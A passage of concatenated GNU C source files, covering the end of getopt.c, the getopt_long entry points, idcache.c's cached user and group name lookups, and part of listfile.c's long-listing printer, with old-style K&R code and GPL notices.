   contain conflicting prototypes for getopt.  */
#include <stdlib.h>
#endif	/* GNU C library.  */

/* This version of `getopt' appears to the caller like standard Unix `getopt'
   but it behaves differently for the user, since it allows the user
   to intersperse the options with the other arguments.

   As `getopt' works, it permutes the elements of ARGV so that,
   when it is done, all the options precede everything else.  Thus
   all application programs are extended to handle flexible argument order.

   Setting the environment variable POSIXLY_CORRECT disables permutation.
   Then the behavior is completely standard.

   GNU application programs can use a third alternative mode in which
   they can distinguish the relative order of options and other arguments.  */

#include "getopt.h"

/* For communication from `getopt' to the caller.
   When `getopt' finds an option that takes an argument,
   the argument value is returned here.
   Also, when `ordering' is RETURN_IN_ORDER,
   each non-option ARGV-element is returned here.  */

char *optarg = NULL;

/* Index in ARGV of the next element to be scanned.
   This is used for communication to and from the caller
   and for communication between successive calls to `getopt'.

   On entry to `getopt', zero means this is the first call; initialize.

   When `getopt' returns EOF, this is the index of the first of the
   non-option elements that the caller should itself scan.

   Otherwise, `optind' communicates from one call to the next
   how much of ARGV has been scanned so far.  */

/* XXX 1003.2 says this must be 1 before any call.  */
int optind = 0;

/* The next char to be scanned in the option-element
   in which the last option character we returned was found.
   This allows us to pick up the scan where we left off.

   If this is zero, or a null string, it means resume the scan
   by advancing to the next ARGV-element.  */

static char *nextchar;

/* Callers store zero here to inhibit the error message
   for unrecognized options.  */

int opterr = 1;

/* Set to an option character which was unrecognized.
   This must be initialized on some systems to avoid linking in the
   system's own getopt implementation.  */

int optopt = '?';

/* Describe how to deal with options that follow non-option ARGV-elements.

   If the caller did not specify anything,
   the default is REQUIRE_ORDER if the environment variable
   POSIXLY_CORRECT is defined, PERMUTE otherwise.

   REQUIRE_ORDER means don't recognize them as options;
   stop option processing when the first non-option is seen.
   This is what Unix does.
   This mode of operation is selected by either setting the environment
   variable POSIXLY_CORRECT, or using `+' as the first character
   of the list of option characters.

   PERMUTE is the default.  We permute the contents of ARGV as we scan,
   so that eventually all the non-options are at the end.  This allows options
   to be given in any order, even with programs that were not written to
   expect this.

   RETURN_IN_ORDER is an option available to programs that were written
   to expect options and other ARGV-elements in any order and that care about
   the ordering of the two.  We describe each non-option ARGV-element
   as if it were the argument of an option with character code 1.
   Using `-' as the first character of the list of option characters
   selects this mode of operation.

   The special argument `--' forces an end of option-scanning regardless
   of the value of `ordering'.  In the case of RETURN_IN_ORDER, only
   `--' can cause `getopt' to return EOF with `optind' != ARGC.  */

static enum
{
  REQUIRE_ORDER, PERMUTE, RETURN_IN_ORDER
} ordering;

/* Value of POSIXLY_CORRECT environment variable.  */
static char *posixly_correct;

#ifdef	__GNU_LIBRARY__
/* We want to avoid inclusion of string.h with non-GNU libraries
   because there are many ways it can cause trouble.
   On some systems, it contains special magic macros that don't work
   in GCC.  */
#include <string.h>
#define	my_index	strchr
#else

/* Avoid depending on library functions or files
   whose names are inconsistent.  */

char *getenv ();

static char *
my_index (str, chr)
     const char *str;
     int chr;
{
  while (*str)
    {
      if (*str == chr)
	return (char *) str;
      str++;
    }
  return 0;
}

/* If using GCC, we can safely declare strlen this way.
   If not using GCC, it is ok not to declare it.  */
#ifdef __GNUC__
/* Note that Motorola Delta 68k R3V7 comes with GCC but not stddef.h.
   That was relevant to code that was here before.  */
#if !defined (__STDC__) || !__STDC__
/* gcc with -traditional declares the built-in strlen to return int,
   and has done so at least since version 2.4.5. -- rms.  */
extern int strlen (const char *);
#endif /* not __STDC__ */
#endif /* __GNUC__ */

#endif /* not __GNU_LIBRARY__ */

/* Handle permutation of arguments.  */

/* Describe the part of ARGV that contains non-options that have
   been skipped.  `first_nonopt' is the index in ARGV of the first of them;
   `last_nonopt' is the index after the last of them.  */

static int first_nonopt;
static int last_nonopt;

/* Exchange two adjacent subsequences of ARGV.
   One subsequence is elements [first_nonopt,last_nonopt)
   which contains all the non-options that have been skipped so far.
   The other is elements [last_nonopt,optind), which contains all
   the options processed since those non-options were skipped.

   `first_nonopt' and `last_nonopt' are relocated so that they describe
   the new indices of the non-options in ARGV after they are moved.  */

static void
exchange (argv)
     char **argv;
{
  int bottom = first_nonopt;
  int middle = last_nonopt;
  int top = optind;
  char *tem;

  /* Exchange the shorter segment with the far end of the longer segment.
     That puts the shorter segment into the right place.
     It leaves the longer segment in the right place overall,
     but it consists of two parts that need to be swapped next.  */

  while (top > middle && middle > bottom)
    {
      if (top - middle > middle - bottom)
	{
	  /* Bottom segment is the short one.  */
	  int len = middle - bottom;
	  register int i;

	  /* Swap it with the top part of the top segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[top - (middle - bottom) + i];
	      argv[top - (middle - bottom) + i] = tem;
	    }
	  /* Exclude the moved bottom segment from further swapping.  */
	  top -= len;
	}
      else
	{
	  /* Top segment is the short one.  */
	  int len = top - middle;
	  register int i;

	  /* Swap it with the bottom part of the bottom segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[middle + i];
	      argv[middle + i] = tem;
	    }
	  /* Exclude the moved top segment from further swapping.  */
	  bottom += len;
	}
    }

  /* Update records for the slots the non-options now occupy.  */

  first_nonopt += (optind - last_nonopt);
  last_nonopt = optind;
}

/* Initialize the internal data when the first call is made.  */

static const char *
_getopt_initialize (optstring)
     const char *optstring;
{
  /* Start processing options with ARGV-element 1 (since ARGV-element 0
     is the program name); the sequence of previously skipped
     non-option ARGV-elements is empty.  */

  first_nonopt = last_nonopt = optind = 1;

  nextchar = NULL;

  posixly_correct = getenv ("POSIXLY_CORRECT");

  /* Determine how to handle the ordering of options and nonoptions.  */

  if (optstring[0] == '-')
    {
      ordering = RETURN_IN_ORDER;
      ++optstring;
    }
  else if (optstring[0] == '+')
    {
      ordering = REQUIRE_ORDER;
      ++optstring;
    }
  else if (posixly_correct != NULL)
    ordering = REQUIRE_ORDER;
  else
    ordering = PERMUTE;

  return optstring;
}

/* Scan elements of ARGV (whose length is ARGC) for option characters
   given in OPTSTRING.

   If an element of ARGV starts with '-', and is not exactly "-" or "--",
   then it is an option element.  The characters of this element
   (aside from the initial '-') are option characters.  If `getopt'
   is called repeatedly, it returns successively each of the option characters
   from each of the option elements.

   If `getopt' finds another option character, it returns that character,
   updating `optind' and `nextchar' so that the next call to `getopt' can
   resume the scan with the following option character or ARGV-element.

   If there are no more option characters, `getopt' returns `EOF'.
   Then `optind' is the index in ARGV of the first ARGV-element
   that is not an option.  (The ARGV-elements have been permuted
   so that those that are not options now come last.)

   OPTSTRING is a string containing the legitimate option characters.
   If an option character is seen that is not listed in OPTSTRING,
   return '?' after printing an error message.  If you set `opterr' to
   zero, the error message is suppressed but we still return '?'.

   If a char in OPTSTRING is followed by a colon, that means it wants an arg,
   so the following text in the same ARGV-element, or the text of the following
   ARGV-element, is returned in `optarg'.  Two colons mean an option that
   wants an optional arg; if there is text in the current ARGV-element,
   it is returned in `optarg', otherwise `optarg' is set to zero.

   If OPTSTRING starts with `-' or `+', it requests different methods of
   handling the non-option ARGV-elements.
   See the comments about RETURN_IN_ORDER and REQUIRE_ORDER, above.

   Long-named options begin with `--' instead of `-'.
   Their names may be abbreviated as long as the abbreviation is unique
   or is an exact match for some defined option.  If they have an
   argument, it follows the option name in the same ARGV-element, separated
   from the option name by a `=', or else the in next ARGV-element.
   When `getopt' finds a long-named option, it returns 0 if that option's
   `flag' field is nonzero, the value of the option's `val' field
   if the `flag' field is zero.

   The elements of ARGV aren't really const, because we permute them.
   But we pretend they're const in the prototype to be compatible
   with other systems.

   LONGOPTS is a vector of `struct option' terminated by an
   element containing a name which is zero.

   LONGIND returns the index in LONGOPT of the long-named option found.
   It is only valid when a long-named option has been found by the most
   recent call.

   If LONG_ONLY is nonzero, '-' as well as '--' can introduce
   long-named options.  */

int
_getopt_internal (argc, argv, optstring, longopts, longind, long_only)
     int argc;
     char *const *argv;
     const char *optstring;
     const struct option *longopts;
     int *longind;
     int long_only;
{
  optarg = NULL;

  if (optind == 0)
    optstring = _getopt_initialize (optstring);

  if (nextchar == NULL || *nextchar == '\0')
    {
      /* Advance to the next ARGV-element.  */

      if (ordering == PERMUTE)
	{
	  /* If we have just processed some options following some non-options,
	     exchange them so that the options come first.  */

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (last_nonopt != optind)
	    first_nonopt = optind;

	  /* Skip any additional non-options
	     and extend the range of non-options previously skipped.  */

	  while (optind < argc
		 && (argv[optind][0] != '-' || argv[optind][1] == '\0'))
	    optind++;
	  last_nonopt = optind;
	}

      /* The special ARGV-element `--' means premature end of options.
	 Skip it like a null option,
	 then exchange with previous non-options as if it were an option,
	 then skip everything else like a non-option.  */

      if (optind != argc && !strcmp (argv[optind], "--"))
	{
	  optind++;

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (first_nonopt == last_nonopt)
	    first_nonopt = optind;
	  last_nonopt = argc;

	  optind = argc;
	}

      /* If we have done all the ARGV-elements, stop the scan
	 and back over any non-options that we skipped and permuted.  */

      if (optind == argc)
	{
	  /* Set the next-arg-index to point at the non-options
	     that we previously skipped, so the caller will digest them.  */
	  if (first_nonopt != last_nonopt)
	    optind = first_nonopt;
	  return EOF;
	}

      /* If we have come to a non-option and did not permute it,
	 either stop the scan or describe it to the caller and pass it by.  */

      if ((argv[optind][0] != '-' || argv[optind][1] == '\0'))
	{
	  if (ordering == REQUIRE_ORDER)
	    return EOF;
	  optarg = argv[optind++];
	  return 1;
	}

      /* We have found another option-ARGV-element.
	 Skip the initial punctuation.  */

      nextchar = (argv[optind] + 1
		  + (longopts != NULL && argv[optind][1] == '-'));
    }

  /* Decode the current option-ARGV-element.  */

  /* Check whether the ARGV-element is a long option.

     If long_only and the ARGV-element has the form "-f", where f is
     a valid short option, don't consider it an abbreviated form of
     a long option that starts with f.  Otherwise there would be no
     way to give the -f short option.

     On the other hand, if there's a long option "fubar" and
     the ARGV-element is "-fu", do consider that an abbreviation of
     the long option, just like "--fu", and not "-f" with arg "u".

     This distinction seems to be the most useful approach.  */

  if (longopts != NULL
      && (argv[optind][1] == '-'
	  || (long_only && (argv[optind][2] || !my_index (optstring, argv[optind][1])))))
    {
      char *nameend;
      const struct option *p;
      const struct option *pfound = NULL;
      int exact = 0;
      int ambig = 0;
      int indfound;
      int option_index;

      for (nameend = nextchar; *nameend && *nameend != '='; nameend++)
	/* Do nothing.  */ ;

      /* Test all long options for either exact match
	 or abbreviated matches.  */
      for (p = longopts, option_index = 0; p->name; p++, option_index++)
	if (!strncmp (p->name, nextchar, nameend - nextchar))
	  {
	    if (nameend - nextchar == strlen (p->name))
	      {
		/* Exact match found.  */
		pfound = p;
		indfound = option_index;
		exact = 1;
		break;
	      }
	    else if (pfound == NULL)
	      {
		/* First nonexact match found.  */
		pfound = p;
		indfound = option_index;
	      }
	    else
	      /* Second or later nonexact match found.  */
	      ambig = 1;
	  }

      if (ambig && !exact)
	{
	  if (opterr)
	    fprintf (stderr, "%s: option `%s' is ambiguous\n",
		     argv[0], argv[optind]);
	  nextchar += strlen (nextchar);
	  optind++;
	  return '?';
	}

      if (pfound != NULL)
	{
	  option_index = indfound;
	  optind++;
	  if (*nameend)
	    {
	      /* Don't test has_arg with >, because some C compilers don't
		 allow it to be used on enums.  */
	      if (pfound->has_arg)
		optarg = nameend + 1;
	      else
		{
		  if (opterr)
		    {
		      if (argv[optind - 1][1] == '-')
			/* --option */
			fprintf (stderr,
				 "%s: option `--%s' doesn't allow an argument\n",
				 argv[0], pfound->name);
		      else
			/* +option or -option */
			fprintf (stderr,
			     "%s: option `%c%s' doesn't allow an argument\n",
			     argv[0], argv[optind - 1][0], pfound->name);
		    }
		  nextchar += strlen (nextchar);
		  return '?';
		}
	    }
	  else if (pfound->has_arg == 1)
	    {
	      if (optind < argc)
		optarg = argv[optind++];
	      else
		{
		  if (opterr)
		    fprintf (stderr, "%s: option `%s' requires an argument\n",
			     argv[0], argv[optind - 1]);
		  nextchar += strlen (nextchar);
		  return optstring[0] == ':' ? ':' : '?';
		}
	    }
	  nextchar += strlen (nextchar);
	  if (longind != NULL)
	    *longind = option_index;
	  if (pfound->flag)
	    {
	      *(pfound->flag) = pfound->val;
	      return 0;
	    }
	  return pfound->val;
	}

      /* Can't find it as a long option.  If this is not getopt_long_only,
	 or the option starts with '--' or is not a valid short
	 option, then it's an error.
	 Otherwise interpret it as a short option.  */
      if (!long_only || argv[optind][1] == '-'
	  || my_index (optstring, *nextchar) == NULL)
	{
	  if (opterr)
	    {
	      if (argv[optind][1] == '-')
		/* --option */
		fprintf (stderr, "%s: unrecognized option `--%s'\n",
			 argv[0], nextchar);
	      else
		/* +option or -option */
		fprintf (stderr, "%s: unrecognized option `%c%s'\n",
			 argv[0], argv[optind][0], nextchar);
	    }
	  nextchar = (char *) "";
	  optind++;
	  return '?';
	}
    }

  /* Look at and handle the next short option-character.  */

  {
    char c = *nextchar++;
    char *temp = my_index (optstring, c);

    /* Increment `optind' when we start to process its last character.  */
    if (*nextchar == '\0')
      ++optind;

    if (temp == NULL || c == ':')
      {
	if (opterr)
	  {
	    if (posixly_correct)
	      /* 1003.2 specifies the format of this message.  */
	      fprintf (stderr, "%s: illegal option -- %c\n", argv[0], c);
	    else
	      fprintf (stderr, "%s: invalid option -- %c\n", argv[0], c);
	  }
	optopt = c;
	return '?';
      }
    if (temp[1] == ':')
      {
	if (temp[2] == ':')
	  {
	    /* This is an option that accepts an argument optionally.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		optind++;
	      }
	    else
	      optarg = NULL;
	    nextchar = NULL;
	  }
	else
	  {
	    /* This is an option that requires an argument.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		/* If we end this ARGV-element by taking the rest as an arg,
		   we must advance to the next element now.  */
		optind++;
	      }
	    else if (optind == argc)
	      {
		if (opterr)
		  {
		    /* 1003.2 specifies the format of this message.  */
		    fprintf (stderr, "%s: option requires an argument -- %c\n",
			     argv[0], c);
		  }
		optopt = c;
		if (optstring[0] == ':')
		  c = ':';
		else
		  c = '?';
	      }
	    else
	      /* We already incremented `optind' once;
		 increment it again when taking next ARGV-elt as argument.  */
	      optarg = argv[optind++];
	    nextchar = NULL;
	  }
      }
    return c;
  }
}

int
getopt (argc, argv, optstring)
     int argc;
     char *const *argv;
     const char *optstring;
{
  return _getopt_internal (argc, argv, optstring,
			   (const struct option *) 0,
			   (int *) 0,
			   0);
}

#endif	/* _LIBC or not __GNU_LIBRARY__.  */

#ifdef TEST

/* Compile with -DTEST to make an executable for use in testing
   the above definition of `getopt'.  */

int
main (argc, argv)
     int argc;
     char **argv;
{
  int c;
  int digit_optind = 0;

  while (1)
    {
      int this_option_optind = optind ? optind : 1;

      c = getopt (argc, argv, "abc:d:0123456789");
      if (c == EOF)
	break;

      switch (c)
	{
	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	  if (digit_optind != 0 && digit_optind != this_option_optind)
	    printf ("digits occur in two different argv-elements.\n");
	  digit_optind = this_option_optind;
	  printf ("option %c\n", c);
	  break;

	case 'a':
	  printf ("option a\n");
	  break;

	case 'b':
	  printf ("option b\n");
	  break;

	case 'c':
	  printf ("option c with value `%s'\n", optarg);
	  break;

	case '?':
	  break;

	default:
	  printf ("?? getopt returned character code 0%o ??\n", c);
	}
    }

  if (optind < argc)
    {
      printf ("non-option ARGV-elements: ");
      while (optind < argc)
	printf ("%s ", argv[optind++]);
      printf ("\n");
    }

  exit (0);
}

#endif /* TEST */
/* getopt_long and getopt_long_only entry points for GNU getopt.
   Copyright (C) 1987, 88, 89, 90, 91, 92, 1993, 1994
	Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include "getopt.h"

#if !defined (__STDC__) || !__STDC__
/* This is a separate conditional since some stdc systems
   reject `defined (const)'.  */
#ifndef const
#define const
#endif
#endif

#include <stdio.h>

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


/* This needs to come after some library #include
   to get __GNU_LIBRARY__ defined.  */
#ifdef __GNU_LIBRARY__
#include <stdlib.h>
#else
char *getenv ();
#endif

#ifndef	NULL
#define NULL 0
#endif

int
getopt_long (argc, argv, options, long_options, opt_index)
     int argc;
     char *const *argv;
     const char *options;
     const struct option *long_options;
     int *opt_index;
{
  return _getopt_internal (argc, argv, options, long_options, opt_index, 0);
}

/* Like getopt_long, but '-' as well as '--' can indicate a long option.
   If an option that starts with '-' (not '--') doesn't match a long option,
   but does match a short option, it is parsed as a short option
   instead.  */

int
getopt_long_only (argc, argv, options, long_options, opt_index)
     int argc;
     char *const *argv;
     const char *options;
     const struct option *long_options;
     int *opt_index;
{
  return _getopt_internal (argc, argv, options, long_options, opt_index, 1);
}


#endif	/* _LIBC or not __GNU_LIBRARY__.  */

#ifdef TEST

#include <stdio.h>

int
main (argc, argv)
     int argc;
     char **argv;
{
  int c;
  int digit_optind = 0;

  while (1)
    {
      int this_option_optind = optind ? optind : 1;
      int option_index = 0;
      static struct option long_options[] =
      {
	{"add", 1, 0, 0},
	{"append", 0, 0, 0},
	{"delete", 1, 0, 0},
	{"verbose", 0, 0, 0},
	{"create", 0, 0, 0},
	{"file", 1, 0, 0},
	{0, 0, 0, 0}
      };

      c = getopt_long (argc, argv, "abc:d:0123456789",
		       long_options, &option_index);
      if (c == EOF)
	break;

      switch (c)
	{
	case 0:
	  printf ("option %s", long_options[option_index].name);
	  if (optarg)
	    printf (" with arg %s", optarg);
	  printf ("\n");
	  break;

	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	  if (digit_optind != 0 && digit_optind != this_option_optind)
	    printf ("digits occur in two different argv-elements.\n");
	  digit_optind = this_option_optind;
	  printf ("option %c\n", c);
	  break;

	case 'a':
	  printf ("option a\n");
	  break;

	case 'b':
	  printf ("option b\n");
	  break;

	case 'c':
	  printf ("option c with value `%s'\n", optarg);
	  break;

	case 'd':
	  printf ("option d with value `%s'\n", optarg);
	  break;

	case '?':
	  break;

	default:
	  printf ("?? getopt returned character code 0%o ??\n", c);
	}
    }

  if (optind < argc)
    {
      printf ("non-option ARGV-elements: ");
      while (optind < argc)
	printf ("%s ", argv[optind++]);
      printf ("\n");
    }

  exit (0);
}

#endif /* TEST */
/* idcache.c -- map user and group IDs, cached for speed
   Copyright (C) 1985, 1988, 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>

#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif
#ifndef _POSIX_VERSION
struct passwd *getpwuid ();
struct passwd *getpwnam ();
struct group *getgrgid ();
struct group *getgrnam ();
#endif

char *xmalloc ();
char *xstrdup ();

struct userid
{
  union
    {
      uid_t u;
      gid_t g;
    } id;
  char *name;
  struct userid *next;
};

static struct userid *user_alist;

/* The members of this list have names not in the local passwd file.  */
static struct userid *nouser_alist;

/* Translate UID to a login name or a stringified number,
   with cache.  */

char *
getuser (uid)
     uid_t uid;
{
  register struct userid *tail;
  struct passwd *pwent;
  char usernum_string[20];

  for (tail = user_alist; tail; tail = tail->next)
    if (tail->id.u == uid)
      return tail->name;

  pwent = getpwuid (uid);
  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->id.u = uid;
  if (pwent == 0)
    {
      sprintf (usernum_string, "%u", (unsigned) uid);
      tail->name = xstrdup (usernum_string);
    }
  else
    tail->name = xstrdup (pwent->pw_name);

  /* Add to the head of the list, so most recently used is first.  */
  tail->next = user_alist;
  user_alist = tail;
  return tail->name;
}

/* Translate USER to a UID, with cache.
   Return NULL if there is no such user.
   (We also cache which user names have no passwd entry,
   so we don't keep looking them up.)  */

uid_t *
getuidbyname (user)
     char *user;
{
  register struct userid *tail;
  struct passwd *pwent;

  for (tail = user_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *user && !strcmp (tail->name, user))
      return &tail->id.u;

  for (tail = nouser_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *user && !strcmp (tail->name, user))
      return 0;

  pwent = getpwnam (user);

  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->name = xstrdup (user);

  /* Add to the head of the list, so most recently used is first.  */
  if (pwent)
    {
      tail->id.u = pwent->pw_uid;
      tail->next = user_alist;
      user_alist = tail;
      return &tail->id.u;
    }

  tail->next = nouser_alist;
  nouser_alist = tail;
  return 0;
}

/* Use the same struct as for userids.  */
static struct userid *group_alist;
static struct userid *nogroup_alist;

/* Translate GID to a group name or a stringified number,
   with cache.  */

char *
getgroup (gid)
     gid_t gid;
{
  register struct userid *tail;
  struct group *grent;
  char groupnum_string[20];

  for (tail = group_alist; tail; tail = tail->next)
    if (tail->id.g == gid)
      return tail->name;

  grent = getgrgid (gid);
  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->id.g = gid;
  if (grent == 0)
    {
      sprintf (groupnum_string, "%u", (unsigned int) gid);
      tail->name = xstrdup (groupnum_string);
    }
  else
    tail->name = xstrdup (grent->gr_name);

  /* Add to the head of the list, so most recently used is first.  */
  tail->next = group_alist;
  group_alist = tail;
  return tail->name;
}

/* Translate GROUP to a UID, with cache.
   Return NULL if there is no such group.
   (We also cache which group names have no group entry,
   so we don't keep looking them up.)  */

gid_t *
getgidbyname (group)
     char *group;
{
  register struct userid *tail;
  struct group *grent;

  for (tail = group_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *group && !strcmp (tail->name, group))
      return &tail->id.g;

  for (tail = nogroup_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *group && !strcmp (tail->name, group))
      return 0;

  grent = getgrnam (group);

  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->name = xstrdup (group);

  /* Add to the head of the list, so most recently used is first.  */
  if (grent)
    {
      tail->id.g = grent->gr_gid;
      tail->next = group_alist;
      group_alist = tail;
      return &tail->id.g;
    }

  tail->next = nogroup_alist;
  nogroup_alist = tail;
  return 0;
}
/* listfile.c -- display a long listing of a file
   Copyright (C) 1991, 1993 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include <errno.h>
#include "pathmax.h"

#if defined(HAVE_STRING_H) || defined(STDC_HEADERS)
#include <string.h>
#else
#include <strings.h>
#endif
#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *getenv ();
extern int errno;
#endif

/* Since major is a function on SVR4, we can't use `ifndef major'.  */
#ifdef MAJOR_IN_MKDEV
#include <sys/mkdev.h>
#define HAVE_MAJOR
#endif
#ifdef MAJOR_IN_SYSMACROS
#include <sys/sysmacros.h>
#define HAVE_MAJOR
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISCHR
#undef S_ISBLK
#undef S_ISLNK
#endif

#ifndef S_ISCHR
#define S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#endif
#ifndef S_ISBLK
#define S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#endif
#if defined(S_IFLNK) && !defined(S_ISLNK)
#define S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#endif

#if defined(S_ISLNK)
int readlink ();
#endif

/* Extract or fake data from a `struct stat'.
   ST_NBLOCKS: Number of 512-byte blocks in the file
   (including indirect blocks).
   HP-UX, perhaps uniquely, counts st_blocks in 1024-byte units.
   This workaround loses when mixing HP-UX and 4BSD filesystems, though.  */
#ifdef _POSIX_SOURCE
# define ST_NBLOCKS(statp) (((statp)->st_size + 512 - 1) / 512)
#else
# ifndef HAVE_ST_BLOCKS
#  define ST_NBLOCKS(statp) (st_blocks ((statp)->st_size))
# else
#  if defined(hpux) || defined(__hpux__)
#   define ST_NBLOCKS(statp) ((statp)->st_blocks * 2)
#  else
#   define ST_NBLOCKS(statp) ((statp)->st_blocks)
#  endif
# endif
#endif

/* Convert B 512-byte blocks to kilobytes if K is nonzero,
   otherwise return it unchanged. */
#define convert_blocks(b, k) ((k) ? ((b) + 1) / 2 : (b))

#ifndef _POSIX_VERSION
struct passwd *getpwuid ();
struct group *getgrgid ();
#endif

#ifdef major			/* Might be defined in sys/types.h.  */
#define HAVE_MAJOR
#endif
#ifndef HAVE_MAJOR
#define major(dev)  (((dev) >> 8) & 0xff)
#define minor(dev)  ((dev) & 0xff)
#endif
#undef HAVE_MAJOR

char *xmalloc ();
void error ();
void mode_string ();

char *get_link_name ();
char *getgroup ();
char *getuser ();
void print_name_with_quoting ();

/* NAME is the name to print.
   RELNAME is the path to access it from the current directory.
   STATP is the results of stat or lstat on it.
   STREAM is the stdio stream to print on.  */

void
list_file (name, relname, statp, stream)
     char *name;
     char *relname;
     struct stat *statp;
     FILE *stream;
{
  static int kilobytes = -1;	/* -1 = uninitialized, 0 = 512, 1 = 1024. */
  char modebuf[20];
  char timebuf[40];
  time_t current_time = time ((time_t *) 0);

  if (kilobytes == -1)
    kilobytes = getenv ("POSIXLY_CORRECT") == 0;

  mode_string (statp->st_mode, modebuf);
  modebuf[10] = '\0';

  strcpy (timebuf, ctime (&statp->st_mtime));
  if (current_time > statp->st_mtime + 6L * 30L * 24L * 60L * 60L /* Old. */
      || current_time < statp->st_mtime - 60L * 60L) /* In the future. */
    {
      /* The file is fairly old or in the future.
	 POSIX says the cutoff is 6 months old;
	 approximate this by 6*30 days.
	 Allow a 1 hour slop factor for what is considered "the future",
	 to allow for NFS server/client clock disagreement.
	 Show the year instead of the time of day.  */
      strcpy (timebuf + 11, timebuf + 19);
    }
  timebuf[16] = 0;

  fprintf (stream, "%6lu ", statp->st_ino);

  fprintf (stream, "%4u ", convert_blocks (ST_NBLOCKS (statp), kilobytes));

  /* The space between the mode and the number of links is the POSIX
     "optional alternate access method flag". */
  fprintf (stream, "%s %3u ", modebuf, statp->st_nlink);

  fprintf (stream, "%-8.8s ", getuser (statp->st_uid));

  fprintf (stream, "%-8.8s ", getgroup (statp->st_gid));

  if (S_ISCHR (statp->st_mode) || S_ISBLK (statp->st_mode))
#ifdef HAVE_ST_RDEV
    fprintf (stream, "%3u, %3u ", major (statp->st_rdev), minor (statp->st_rdev));
#else
    fprintf (stream, "         ");
#endif
  else
    fprintf (stream, "%8lu ", statp->st_size);

  fprintf (stream, "%s ", timebuf + 4);

  print_name_with_quoting (name, stream);

#ifdef S_ISLNK
  if (S_ISLNK (statp->st_mode))
    {
      char *linkname = get_link_name (name, relname);

      if (linkname)
	{
	  fputs (" -> ", stream);
	  print_name_with_quoting (linkname, stream);
	  free (linkname);
	}
    }
#endif
  putc ('\n', stream);
}

void
print_name_with_quoting (p, stream)
     register char *p;
     FILE *stream;
{
  register unsigned char c;

  while ((c = *p++) != '\0')
    {
      switch (c)
	{
	case '\\':
	  fprintf (stream, "\\\\");
	  break;

	case '\n':
	  fprintf (stream, "\\n");
	  break;

	case '\b':
	  fprintf (stream, "\\b");
	  break;

	case '\r':
	  fprintf (stream, "\\r");
	  break;

	case '\t':
	  fprintf (stream, "\\t");
	  break;

	case '\f':
	  fprintf (stream, "\\f");
	  break;

	case ' ':
	  fprintf (stream, "\\ ");
	  break;

	case '"':
	  fprintf (stream, "\\\"");
	  break;

	default:
	  if (c > 040 && c < 0177)
	    putc (c, stream);
	  else
	    fprintf (stream, "\\%03o", (unsigned int) c);
	}
    }
}

#ifdef S_ISLNK
char *
get_link_name (name, relname)
     char *name;
     char *relname;
{
  register char *linkname;
  register int linklen;

  /* st_size is wrong for symlinks on AIX, and on
     mount points with some automounters.
     So allocate a pessimistic PATH_MAX + 1 bytes.  */
#define LINK_BUF PATH_MAX
